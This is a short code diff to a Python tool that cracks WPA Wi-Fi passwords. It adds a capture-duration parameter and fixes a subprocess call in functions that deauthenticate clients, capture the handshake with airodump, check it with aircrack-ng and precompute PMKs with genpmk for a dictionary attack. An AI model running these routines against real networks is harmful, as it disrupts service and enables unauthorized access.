@@ -8,7 +8,7 @@ import os
 import re
 
 
-def wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, directory, dictionary):
+def wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, directory, dictionary, seconds):
     pcapfile4way = os.path.join(directory, 'wpa')
     change_channel(interface, channel)
     ctr = 1
@@ -16,7 +16,7 @@ def wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, direc
         if c_mac:
             deauth_client(interface, number_of_deuath, ap_mac_address, c_mac)
         deauth_broadcast(interface, number_of_deuath, ap_mac_address)
-        airodump(interface, ap_mac_address, channel, pcapfile4way)
+        airodump(interface, ap_mac_address, channel, pcapfile4way, seconds)
         second_command_wpa = subprocess.run(
             ['aircrack-ng', f'{pcapfile4way}-0{ctr}.cap'], capture_output=True, text=True)
         if re.search("\([1-9]+ handshake[s]?\)", second_command_wpa.stdout):
@@ -35,7 +35,7 @@ def wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, direc
 def fast_wpa_crack(interface, number_of_deuath, ap_mac_address, c_mac, channel, directory, dictionary):
 
     pmkfile = os.path.join(results, 'pmkfile')
-    first_command_wpa_fast = sb.run(
+    first_command_wpa_fast = subprocess.run(
         ['sudo', 'genpmk', dictionary, '-d', pmkfile, '-s', ssid], capture_output=True, text=True)
     pcapfile4way = os.path.join(directory, 'wpa')
     change_channel(interface, channel)
